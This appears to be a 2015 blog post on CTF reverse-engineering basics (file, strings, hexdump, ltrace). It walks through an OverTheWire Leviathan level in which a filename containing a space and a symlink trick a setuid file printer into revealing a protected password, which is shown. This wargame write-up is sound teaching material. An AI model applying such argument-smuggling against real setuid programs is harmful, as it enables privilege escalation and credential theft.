---
layout: post
title: "Learning from CTF : Reverse Engineering"
date: 2015-01-02 03:15:59 +0000
comments: true
categories: 
---

This post lists the learnings from the CTF while doing Reverse Engineering.
<!-- more -->


If we are provided with a binary to reverse engineer, for example asking for password.

<ol>

<li>
file: The first step is to run file command on the binary which would tell us whether it is 32/64 bit or statically/dynamically linked etc.
```
bitvijays@kali:~/Desktop/CTF/31C3$ file cfy 
cfy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x9bc623f046535fba50a2124909fb871e5daf198e, not stripped
```
</li>
<li>
The second step could be running strings or "hexdump -C" on it, specially in the case of very simple re challenges like asking for password and stored in an array.
```
bitvijays@kali:~$ strings check 
/lib/ld-linux.so.2
D$,1
D$%secrf
D$)et
D$ love
T$,e3
[^_]
password: 
/bin/sh
Wrong password, Good Bye ...
;*2$"
```
```
hexdump -C check | more 
00000540  31 c0 c7 44 24 18 73 65  78 00 c7 44 24 25 73 65  |1..D$.sec..D$%se|
00000550  63 72 66 c7 44 24 29 65  74 c6 44 24 2b 00 c7 44  |crf.D$)et.D$+..D|
00000560  24 1c 67 6f 64 00 c7 44  24 20 6c 6f 76 65 c6 44  |$.god..D$ love.D|
```
</li>

<li>
The next step could be running strace or ltrace on the binary.

strace: trace system calls and signals
ltrace: A library call tracer
</li>


</ol>

###Examples
<ol>
<li>Consider a binary which is setuid and used to read files.
```
leviathan2@melinda:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename

leviathan2@melinda:~$ ls -la
-r-sr-x---   1 leviathan3 leviathan2 7498 Nov 14 10:32 printfile
```
We need to read 
```
leviathan2@melinda:~$ ls -l /etc/leviathan_pass/leviathan3 
-r-------- 1 leviathan3 leviathan3 11 Nov 14 10:32 /etc/leviathan_pass/leviathan3
```
Let's see the ltrace of the binary while accessing a file which we are allowed to read
```
leviathan2@melinda:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2 
__libc_start_main(0x804852d, 2, 0xffffd774, 0x8048600 <unfinished ...>
access("/etc/leviathan_pass/leviathan2", 4)                                                                            = 0
snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2")                  = 39
system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                 = 0
+++ exited (status 0) +++
```
Let see what happen when we try to access file which we don't have permission to.
```
leviathan2@melinda:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852d, 2, 0xffffd774, 0x8048600 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                                                                            = -1
puts("You cant have that file..."You cant have that file...
)                                                                                     = 27
+++ exited (status 1) +++
```
So it's a matter of tricking access(), if the call to access() succeeds then it calls system("cat file"), so if pass the argument printfile /etc/issue, then it works.
We can get around it by using a space in our file name. Eg: touch foo\ bar. then we create a symlink to the password file and call it foo. ln -s /etc/leviathanpass/leviathan3 foo

```
leviathan2@melinda:~$ mkdir /tmp/levi
leviathan2@melinda:~$ cd /tmp/levi
leviathan2@melinda:/tmp/levi$ ls
leviathan2@melinda:/tmp/levi$ ln -s /etc/leviathan_pass/leviathan3 ./foo
leviathan2@melinda:/tmp/levi$ touch foo\ bar
leviathan2@melinda:/tmp/levi$ ~/printfile foo\ bar 
Ahdiemoo1j
/bin/cat: bar: No such file or directory
```
</li>
</ol>
